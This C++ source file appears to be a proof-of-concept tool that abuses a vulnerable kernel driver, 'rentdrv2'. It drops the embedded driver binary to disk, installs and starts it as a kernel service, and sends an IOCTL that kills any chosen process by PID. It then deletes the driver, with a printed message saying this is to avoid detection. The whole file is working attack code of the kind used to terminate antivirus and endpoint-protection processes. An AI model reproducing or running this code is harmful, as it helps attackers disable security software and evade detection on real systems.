/*
 _   __ _____ _____  _    _ _   _
| | / /|  ___|  _  || |  | | | | |
| |/ / | |__ | | | || |  | | | | |
|    \ |  __|| | | || |/\| | | | |
| |\  \| |___\ \_/ /\  /\  / |_| |
\_| \_/\____/ \___/  \/  \/ \___/
                            2023
*/

#include <iostream>
#include <Windows.h>
#include <string>
#include <filesystem>
#include <ShlObj_core.h>
#include "rentdrv2_64.hh"
#include "rentdrv2_32.hh"


class RentDrv {

private:

    #pragma pack ( 1 )
    typedef struct RentDrivStruct {

        /*
            1 - Kill a process by PID
            2 - Kill a process by name
            3 - Kill a process and childs by the parent process name
        */
        UINT level; // Required field !
        SIZE_T pid; // Optional based on level
        wchar_t path[ 1024 ]; // Optional based on level

    } _RentDrivStruct, *PRentDrivStruct;

    SC_HANDLE hSC, hService;

    auto InstallDriver(
    
    ) -> BOOLEAN {

        this->hSC = ::OpenSCManager(
            
            _In_opt_ NULL,
            _In_opt_ NULL,
            _In_ SC_MANAGER_CREATE_SERVICE
        
        );

        if ( this->hSC == NULL ) return FALSE;

        this->hService = ::CreateServiceA(
            
            _In_ this->hSC,
            _In_ "rentdrv2",
            _In_opt_ "rentdrv2",
            _In_ SC_MANAGER_ALL_ACCESS,
            _In_ SERVICE_KERNEL_DRIVER,
            _In_ 1,
            _In_ SERVICE_ERROR_NORMAL,
            _In_opt_ std::string(std::filesystem::current_path().string()).append("\\rentdrv2.sys").c_str(),
            _In_opt_ NULL,
            _Out_opt_ NULL,
            _In_opt_ NULL,
            _In_opt_ NULL,
            _In_opt_ NULL
        
        );

        if ( hService == NULL ) {

            this->hService = ::OpenServiceA(
                
                _In_ this->hSC,
                _In_ "rentdrv2",
                _In_ SERVICE_ALL_ACCESS
            
            );

            if ( this->hService == NULL ) {

                ::CloseServiceHandle(
                    
                    _In_ this->hSC
                
                );

                return FALSE;
            }

        }

        ::CloseServiceHandle(
            
            _In_ this->hSC
        
        );

        ::CloseServiceHandle(
            
            _In_ this->hService
        
        );

        return TRUE;
    }

    auto StartDriver(
    
    ) -> BOOLEAN {

        this->hSC = ::OpenSCManagerA(
            
            _In_opt_ NULL,
            _In_opt_ NULL,
            _In_ SC_MANAGER_CREATE_SERVICE
        
        );

        if ( this->hSC == NULL ) return FALSE;

        this->hService = ::OpenServiceA(
            
            _In_ this->hSC,
            _In_ "rentdrv2",
            _In_ SERVICE_ALL_ACCESS
        
        );

        if ( this->hService == NULL ) {

            ::CloseServiceHandle(
                
                _In_ this->hSC
            
            );

            ::CloseServiceHandle(
                
                _In_ this->hService
            
            );

            return FALSE;
        }

        BOOL isStarted = ::StartServiceA(
            
            _In_ this->hService,
            _In_ 0,
            _In_ NULL
        
        );

        if (!isStarted) {

            ::CloseServiceHandle(
                
                _In_ this->hSC
            
            );

            ::CloseServiceHandle(
                
                _In_ this->hService
            
            );

            return FALSE;
        }

        ::CloseServiceHandle(
            
            _In_ this->hSC
        
        );

        ::CloseServiceHandle(
            
            _In_ this->hService
        
        );

        return TRUE;
    }

    auto StopDriver(
    
    ) -> BOOLEAN {

        this->hSC = ::OpenSCManagerA(
            
            _In_opt_ NULL,
            _In_opt_ NULL,
            _In_ SC_MANAGER_CREATE_SERVICE
        
        );

        if ( this->hSC == NULL ) return FALSE;

        this->hService = ::OpenServiceA(
            
            _In_ this->hSC,
            _In_ "rentdrv2",
            _In_ SERVICE_ALL_ACCESS
        
        );

        if ( this->hService == NULL ) {

            ::CloseServiceHandle(
                
                _In_ this->hSC
            
            );

            ::CloseServiceHandle(
                
                _In_ this->hService
            
            );

            return FALSE;
        }

        SERVICE_STATUS serviceStatus;

        if ( !::ControlService(

            _In_ this->hService,
            _In_ SERVICE_CONTROL_STOP,
            _Out_ &serviceStatus

        ) || !::DeleteService(

            _In_ this->hService

        ) ) {

            ::CloseServiceHandle(
                
                _In_ this->hSC
            
            );

            ::CloseServiceHandle(
                
                _In_ this->hService
            
            );

            return FALSE;
        }

        ::CloseServiceHandle(
            
            _In_ this->hSC
        
        );

        ::CloseServiceHandle(
            
            _In_ this->hService
        
        );

        return TRUE;
    }

    auto DropDriverOnDisk(
    
    ) -> BOOL {

        auto hFile = ::CreateFileA(
            
            _In_ std::string(std::filesystem::current_path().string()).append("\\rentdrv2.sys").c_str(),
            _In_ GENERIC_WRITE,
            _In_ 0,
            _In_opt_ NULL,
            _In_ CREATE_ALWAYS,
            _In_ FILE_ATTRIBUTE_NORMAL,
            _In_opt_ NULL
        
        );

        if ( hFile == INVALID_HANDLE_VALUE ) return FALSE;

        DWORD dwWritten{ 0 }, dwFileSZ{ 0 };

        BOOL bWow64Process;

        ::IsWow64Process(
            
            _In_ ::GetCurrentProcess( ),
            _Out_ &bWow64Process
        
        );

        dwFileSZ = bWow64Process ? DRIVER_SIZE_64 : DRIVER_SIZE_32;

        unsigned char * rentdrv2 = bWow64Process ? RENT_DRIVER_64 : RENT_DRIVER_32;

        if ( !::WriteFile(
            
            _In_ hFile,
            _In_ rentdrv2,
            _In_ dwFileSZ,
            _Out_ &dwWritten, 
            _Inout_opt_ NULL
        
        ) ) {

            ::CloseHandle(
            
                _In_ hFile

            );

            return FALSE;
        }

        ::CloseHandle(
            
            _In_ hFile
        
        );

        return dwWritten == dwFileSZ;
    }

    auto DeleteDriverFromDisk(
    
    ) -> BOOLEAN {

        return ::DeleteFileA(
            
            _In_ std::string(std::filesystem::current_path().string()).append("\\rentdrv2.sys").c_str()
        
        );

    }


public:
    RentDrv(
    
    ) {

        if ( !this->DropDriverOnDisk( ) ) std::printf( "[X] Fail drop the Driver FILE on Disk\n" );

        if ( !this->InstallDriver( ) ) std::printf( "[X] Fail to install the Driver\n" );

        if ( !this->StartDriver( ) ) std::printf( "[X] Fail to start the Driver Service\n" );

    }

    auto KillProcessByPID(
        
        DWORD dwPID
    
    ) -> void {

        RentDrivStruct driverIoctl;

        driverIoctl.level = 1;
        driverIoctl.pid = dwPID;

        std::printf( "[!] Kill process started !\n" );

        auto hDriver = ::CreateFile(
            
            _In_ L"\\\\.\\rentdrv2",
            _In_ GENERIC_READ | GENERIC_WRITE,
            _In_ FILE_SHARE_READ | FILE_SHARE_WRITE,
            _In_opt_ NULL,
            _In_ OPEN_EXISTING,
            _In_ FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
            _In_opt_ NULL
        
        );

        ::DeviceIoControl(
            
            _In_ hDriver,
            _In_ 0x22E010,
            _In_ &driverIoctl,
            _In_ sizeof( RentDrivStruct ),
            _Out_opt_ NULL,
            _Out_opt_ NULL,
            _Out_opt_ NULL,
            _Out_opt_ NULL
        
        );

        ::CloseHandle( 
            
            _In_ hDriver
        
        );

        std::printf( "[!] Kill process ended !\n" );

    }

    ~RentDrv(
    
    ) {

        if ( this->hSC != NULL || this->hService != NULL ) {

            ::CloseServiceHandle(
                
                _In_ this->hSC
            
            );

            ::CloseServiceHandle(
                
                _In_ this->hService
            
            );

        }

        if ( !this->StopDriver( ) ) std::printf( "[X] Fail to start the Driver\n" );

        if ( !this->DeleteDriverFromDisk( ) ) std::printf( "[X] Fail to delete the Driver from disk\n" );

        std::printf( "[!] All PoC files are cleaned !!\n" );

    }


};


auto main(

    int argc, char* argv[]

) -> int {

    std::cout << "Hello World!\n";

    if ( argc != 2 ) {

        std::cout << "[!] Usage: " << argv[ 0 ] << " <PID> \n";

        return 1;
    }

    if ( !::IsUserAnAdmin( ) ) {

        std::cout << "[X] You are initializing a driver, remember, you need to run with right button -> run as administrator\n";

        return 1;
    }

    auto dwPid = 0;

    try {

        dwPid = std::stoi( argv[ 1 ] );

    }
    catch ( const std::invalid_argument& e ) {

        std::cout << "[X] Invalid argument sure that is a pid(integer 4 bytes) ?\n";

        return 1;
    }
    catch ( const std::out_of_range& e ) {

        std::cout << "[X] Invalid argument that is a string not a pid(integer 4 bytes) !\n";

        return 1;
    }

    auto rentDrv = new RentDrv( );

    std::printf( "[!] Driver is initialized !\n" );
    
    rentDrv->KillProcessByPID( dwPid );

    std::printf( "[!] Press any key to stop driver and clean up all POC files to avoid detection !\n" );

    std::cin.get( );
    
    rentDrv->~RentDrv( );

    return 0;
}